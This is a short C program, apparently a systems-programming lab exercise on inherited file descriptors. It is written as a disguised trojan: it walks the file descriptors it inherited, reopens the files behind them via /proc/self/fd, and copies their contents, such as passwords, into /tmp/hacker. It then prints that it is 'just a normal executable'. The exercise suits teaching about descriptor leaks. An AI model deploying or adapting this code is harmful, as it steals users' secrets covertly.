#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */

  for (long i = 3; i < max_fd; i++) {
    if (i == out) continue;
    char path[100];
    memset(path, 0, 100);
    snprintf(path, 99, "/proc/self/fd/%ld", i);
    char passpath[256];
    memset(passpath, 0, 256);
    if (readlink(path, passpath, 256) != -1) {
      fprintf(stderr, "path=%s\n", path);
      fprintf(stderr, "pass=%s\n", passpath);
      int pass_fd = Open(passpath, O_RDONLY, 0);
      char pass[256];
      memset(pass, 0, 256);
      Read(pass_fd, pass, 256);
      Write(out, pass, 256);
    }
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}

// vim: et sw=2 ts=2
